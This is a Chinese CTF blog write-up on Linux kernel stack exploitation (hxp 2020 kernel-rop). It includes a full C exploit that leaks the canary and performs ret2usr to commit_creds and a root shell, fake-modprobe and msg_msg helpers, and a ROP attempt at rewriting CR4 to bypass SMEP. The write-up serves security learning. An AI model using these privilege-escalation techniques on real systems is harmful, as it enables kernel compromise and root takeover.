---
layout: post
tags: [kernel_pwn]
title: "kernel stack 2: ret2usr"
author: wsxk
date: 2026-9-10
comments: true
---

- [例题: hxp 2020 kernel-rop](#例题-hxp-2020-kernel-rop)
- [4. canary：ret2usr](#4-canaryret2usr)
- [5. canary+smep：ROP](#5-canarysmeprop)
  - [5.1 smep的原理](#51-smep的原理)
  - [5.2 ROP + native\_write\_cr4 + ret2usr(已失效)](#52-rop--native_write_cr4--ret2usr已失效)
  - [5.3 ROP提权](#53-rop提权)


# 例题: hxp 2020 kernel-rop<br>
非常好的试验例题:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260821220047.png)
漏洞也很明显，栈溢出。<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260822203851.png)
还有一个栈溢出读。<br>

# 4. canary：ret2usr<br>
本质是劫持内核控制流，使其跳转到用户态的函数并执行。<br>
正如[https://wsxk.github.io/kernel_stack1/](https://wsxk.github.io/kernel_stack1/)提到的，要想使用ret2usr技术，需要关闭`smep、smap、kpti`3个机制的保护才行。<br>
```sh
# qemu 启动脚本
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,-smep,-smap \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr nopti quiet panic=1" \
    -s
```
exp:<br>
```c
// gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx

#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h> // read, write
#include <stdlib.h>
#include <fcntl.h> // define open, O_RDONLY, O_WRONLY, O_CREAT 
#include <signal.h>
#include <sys/wait.h> // waitpid
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>  // ioctl
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h> // msg_msg 
#include <sched.h> 
#include <stdint.h>


size_t commit_creds= 0xffffffff814c6410;
size_t prepare_kernel_cred =0xffffffff814c67f0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    user_sp = user_sp -8; // 栈平衡，防止system时出现segmentation fault错误。
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

// ret2usr
unsigned long user_rip = (unsigned long)get_root_shell;
void escalate_privs(void){
    __asm__(
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, commit_creds;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
    );
}


// kernel shellcode
__attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
    __asm__ (
        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
        "mov rdi, 0;"
        "call rbx;"     //prepare_kernel_cred(0)
        "mov rdi, rax;" 
        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
        "call rbx;"
        "nop;"
        "ret;"
    );
}

// modprobe
void environ_set(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    //system("mkdir /tmp");
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");
    system("chmod +x /tmp/exp");

    system("printf '\xff\xff\xff\xff'  > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    //exit(0);
}
void get_flag(void){
    puts("[*] Run unknown file");
    system("cat /proc/sys/kernel/modprobe");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");
    exit(0);
}


// msg_msg 
// make sure the process run in one fixed cpu
static void pin_to_current_cpu(void)
{
    cpu_set_t set;
    int cpu = sched_getcpu();

    if (cpu < 0) {
        fprintf(stderr, "[-] sched_getcpu failed: %s\n", strerror(errno));
        return;
    }

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0)
        fprintf(stderr, "[-] sched_setaffinity failed: %s\n", strerror(errno));
    else
        fprintf(stderr, "[+] pinned to CPU %d\n", cpu);
}

static void fatal(const char *what)
{
    perror(what);
    exit(EXIT_FAILURE);
}

#define TARGET_OBJECT_SIZE  0x1d0UL          /* need to change according to the situation*/
#define MSG_HEADER_SIZE    0x30UL
#define MSGSEG_HEADER_SIZE 0x08UL
#define DATAMSG_LEN        (0x1000UL - MSG_HEADER_SIZE)       /* 0xfd0 */
#define DATAMSGSEG_LEN     (TARGET_OBJECT_SIZE - MSGSEG_HEADER_SIZE)
#define MESSAGE_SIZE        (DATAMSG_LEN + DATAMSGSEG_LEN)       /* target msg size */

struct message {
    long type;
    unsigned char text[MESSAGE_SIZE];
};

int msg_create_queue(){
    // int key = ftok(".",0); // create a new key and can be found by other process
    // int msg_id = msgget(key,0666| IPC_CREAT);
    int msg_id = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msg_id < 0)
        fatal("msgget");
    fprintf(stderr, "[+] created SysV message queue %d\n", msg_id);
    return msg_id;
}

void msg_send(int msg_id, void *msg_addr,int msg_size, int flag){
    int mark = msgsnd(msg_id,msg_addr,msg_size,flag);
    if (mark <0){
        fatal("msg send");
    }
}

void msg_recv(int msg_id, void *msg_addr,int msg_size,int msg_type, int flag){
    int received = msgrcv(msg_id, msg_addr, msg_size, msg_type, flag);
    if (received < 0){
        fatal("msgrcv");
    }
}


int open_device(){
    int fd = open("/dev/hackme",O_RDWR);
    if (fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
    return fd;
}


int main(){
    // step 0 : save status
    save_status();

    int fd =open_device();
    // step 1: leak the canary
    unsigned long tmp_buf[21];
    unsigned long size=0x10*10;
    read(fd,tmp_buf,size);
    unsigned long canary = tmp_buf[16];
    printf("canary: 0x%llx\n",canary);

    // step 2: construct the payload
    tmp_buf[17] = 0;
    tmp_buf[18] = 0;
    tmp_buf[19] = 0;
    tmp_buf[20] = (unsigned long )escalate_privs;
    write(fd,tmp_buf,size+8);
}
```

# 5. canary+smep：ROP<br>
## 5.1 smep的原理<br>
`smep`，本质上是内核提供的一种特性，**在内核态时，无法执行用户态页表中的代码**<br>
可以通过设置内核的`CR(control register)4寄存器的第20位bit为1`来启动该特性。<br>
内核态是可以自由控制CR4寄存器的值的，所以能够劫持内核态的控制流，理论上就能关闭smep<br>
内核其实提供了修改CR4寄存器的函数`native_write_cr4(value)`<br>
```bash
cat /proc/kallsyms | grep native_write_cr4
ffffffff814443e0 T native_write_cr4
```
而cr4寄存器的具体值，其实可以通过`kernel panic`或者gdb调试给出。（一般情况下该值不会发生变化）<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260824235043.png)

启动命令：<br>
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,-smap \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr nopti quiet panic=1" \
    -s
```

## 5.2 ROP + native_write_cr4 + ret2usr(已失效)<br>
第一个尝试的绕过方法是 rop调用`native_write_cr4`函数，改cr4寄存器的值。<br>
主要差异体现在如下代码:<br>
```c
int main(){
    // step 0 : save status
    save_status();

    int fd =open_device();
    // step 1: leak the canary
    unsigned long tmp_buf[30];
    unsigned long size=0x10*10;
    read(fd,tmp_buf,size);
    unsigned long canary = tmp_buf[16];
    printf("canary: 0x%llx\n",canary);

    // step 2: construct the payload
    tmp_buf[17] = 0;
    tmp_buf[18] = 0;
    tmp_buf[19] = 0;
    tmp_buf[20] = pop_rdi_ret;
    tmp_buf[21] = 0x6f0;
    tmp_buf[22] = native_write_cr4_addr;
    tmp_buf[23] = (unsigned long )escalate_privs;
    write(fd,tmp_buf,size+8*4);

}
```
实际执行时发现不可用:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260825230032.png)
问了一下chatgpt，发现`linux 5.3`版本添加了`CR4 bits pinning`机制：<br>
```c
void native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) { // 判断是否启动了cr4 pinning机制
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```
所以直接调用`native_write_cr4`的方法已经失效了。<br>

## 5.3 ROP提权<br>


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>